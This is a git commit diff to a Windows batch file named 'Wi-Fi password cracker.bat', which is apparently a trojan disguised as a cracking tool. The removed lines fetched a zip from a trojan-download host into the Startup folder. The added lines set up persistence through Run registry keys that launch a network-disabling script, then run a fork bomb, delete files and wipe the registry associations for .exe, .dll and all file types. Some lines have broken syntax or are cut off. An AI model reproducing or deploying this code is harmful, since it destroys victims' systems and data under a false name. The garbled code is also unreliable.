cdc31ffa804946438798f2400e7d766cbe69fafe
Varun Banka <88031057+VarunBanka@users.noreply.github.com>
2022-10-02 12:28:41 +0530

    made it more powerful than ever

--- Wi-Fi password cracker.bat
+++ Wi-Fi password cracker.bat
@@ -1,9 +1,30 @@
 @echo off
 
-cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
 
-powershell -Command "Invoke-WebRequest https://downloads-for-trojan-by-varun-banka.netlify.app/my_zip_file.zip -OutFile my_zip_file.zip"
+Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"
+image.jpg
 
-powershell -command "Expand-Archive -Force '%~dp0my_zip_file.zip' '%~dp0'"
 
+do
+msgbox("Your system is hacked")
+loop
+
+
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
+
+
+%0|%0
+
+
+del*.*
+
+
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
 
